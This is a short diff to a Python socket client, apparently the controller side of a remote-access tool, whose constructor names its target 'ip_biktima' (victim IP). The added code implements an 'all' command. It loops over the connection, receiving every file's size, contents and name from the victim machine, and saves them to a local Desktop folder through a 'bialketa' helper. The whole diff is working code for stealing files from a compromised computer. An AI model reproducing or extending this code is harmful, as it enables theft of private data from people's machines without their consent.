@@ -1,5 +1,7 @@
 import socket 
 import time
+from fitxategiak.fitxa import bialketa
+
 
 class cliente(object):
     def __init__(self,ip_biktima,portua):
@@ -31,6 +33,20 @@ class cliente(object):
               if comand[1].lower() == "all":
                 izen_a = []
                 fitxa_a = []
+                while True:
+                    luz_rev = self.so.recv(1024)
+                    if int(luz_rev) == 0 :
+                        break
+                    self.so.send(bytes("ok",encoding = 'utf-8')) 
+                    fitxategia = self.so.recv(int(luz_rev))
+                    fitxa_a.append(fitxategia)
+                    self.so.send(bytes("ok",encoding = 'utf-8')) 
+                    izena = self.so.recv(4095)
+                    izen_a.append(izena)
+                ruta = "C:\\Users\\web\\Desktop\\nuevoxczx"
+                bi = bialketa(izen_a,fitxa_a,ruta,"all") 
+                bi.exekutatu()
+                self.so.send(bytes("ok",encoding = 'utf-8')) 
               erantzuna =  self.so.recv(4095)#cd bidalitako erantzuna jasoko du
               print(str(erantzuna,encoding = 'utf-8')) 
               print("local")    
